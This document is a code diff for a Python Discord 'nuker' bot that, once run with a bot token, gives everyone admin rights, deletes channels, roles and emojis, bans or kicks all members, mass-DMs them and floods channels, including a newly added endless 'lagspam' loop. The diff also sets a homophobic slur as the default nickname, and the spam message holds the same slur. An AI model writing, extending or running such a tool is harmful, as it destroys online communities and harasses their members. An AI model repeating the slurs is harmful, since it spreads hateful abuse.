@@ -11,7 +11,7 @@ token = "UR BOT TOKEN HERE"
 SPAM_CHANNEL =  ["easy", "we run you" , "shit server" , "nuked"]
 SPAM_CHANNEL_AMOUNT = 40
 SPAM_MESSAGE = ["@everyone Nuked faggots"]
-#  this it the name its gona change the server to
+#  this it the name its gona change the server to 
 GUILD_NAME = "L Server"
 #   To also have change guild icon,
 #   Download the image you want and name it whatever you want. Try and make the name unique.
@@ -23,7 +23,7 @@ ROLE_CREATE_NAME = "this is a role"
 ROLE_SPAM_AMOUNT = 20
 #     if you dont specify any name while running the command "nickall" it will change-
 #     the Nicknames to the name below 
-NICKALL = "Nuked"
+NICKALL = "FAGGOT"
 PREFIX = "!"
 BOT_STATUS = "Ready to be used"
 #     If you only send these commands "!vcspam" , "!caspam" or "!cspam" without a name or amount, it will spam 
@@ -34,6 +34,8 @@ CSPAM_AMOUNT = 10
 CSPAM_NAME = "kek"
 CASPAM_AMOUNT = 10
 CASPAM_NAME = "kek"
+# If you just write !dmall it will send this Message to all users but you can also do !dmall <message>
+#  and chose what message while on Discord
 DM_ALL_MESSAGE = "Hello"
 
 #     Nuker Settings to chose what you want to Bot to do once u run !nuke
@@ -42,6 +44,7 @@ DM_ALL_MESSAGE = "Hello"
 #     Note: Turning of guildicon will make it Bug out so leave it on
 
 giveadmin = True
+channeldel = True
 roledel = True
 emojidel = True
 guildicon = True
@@ -76,8 +79,8 @@ async def on_ready():
          {Fore.LIGHTYELLOW_EX}Will ban all the members in the Server{Fore.RESET}
       {Fore.MAGENTA}!kickall
          {Fore.LIGHTYELLOW_EX}Will kick all the members in the Server{Fore.RESET}
-      {Fore.MAGENTA}!dmall
-         {Fore.LIGHTYELLOW_EX}Will DM every member Possible with a already set message{Fore.RESET}
+      {Fore.MAGENTA}!dmall <message>
+         {Fore.LIGHTYELLOW_EX}Will DM every member possible with whatever message you want{Fore.RESET}
       {Fore.MAGENTA}!dmspam <user> <amount> <message>
          {Fore.LIGHTYELLOW_EX}Will Spam a Users DM's with a set message and sent amount{Fore.RESET}
       {Fore.MAGENTA}!vcspam <amount> <name> 
@@ -103,15 +106,16 @@ async def nuke(ctx):
       try:
         role = discord.utils.get(guild.roles, name = "@everyone")
         await role.edit(permissions = Permissions.all())
-        print(Fore.GREEN + "Given everyone admin." + Fore.RESET)
+        print(Fore.GREEN + "Gave everyone admin." + Fore.RESET)
       except:
         print(Fore.RED + "Was unable to give everyone admin" + Fore.RESET)
     for channel in guild.channels:
-      try:
-        await channel.delete()
-        print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
-      except:
-        print(Fore.RED + f"{channel.name} was NOT deleted." + Fore.RESET)
+      if channeldel == True:
+        try:
+          await channel.delete()
+          print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
+        except:
+          print(Fore.RED + f"{channel.name} was NOT deleted." + Fore.RESET)
     for role in guild.roles:
       if roledel == True:
         try:
@@ -232,14 +236,14 @@ async def nickall(ctx, *, name=NICKALL):
       print(f"{Fore.RED}Coudln't change {member}'s nickname to {name}{Fore.RESET}")
 
 @client.command()
-async def dmall(ctx):
+async def dmall(ctx, *, message=DM_ALL_MESSAGE):
     await ctx.message.delete()
     for member in ctx.guild.members:
         try:
             if member.id == client.user.id:
                 pass
             else:
-                await member.send(DM_ALL_MESSAGE)
+                await member.send(message)
                 print(f"{Fore.GREEN}Sent DM to {member}{Fore.RESET}")
                 # To not get rate limited I added 1s delay between each DM
                 await asyncio.sleep(1)
@@ -275,6 +279,14 @@ async def caspam(ctx, amount=CASPAM_AMOUNT, *, name=CASPAM_NAME):
       await ctx.guild.create_category(CASPAM_NAME)
   print(f"{Fore.GREEN}Created {amount} of Categorys with the name {CASPAM_NAME}")
 
+@client.command()
+async def lagspam(ctx):
+  print(f"{Fore.GREEN}Lagspam Started{Fore.RESET}")
+  while True:
+    for channel in ctx.guild.text_channels:
+      await channel.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
+
+      
 @client.event
 async def on_guild_channel_create(channel):
   while True:
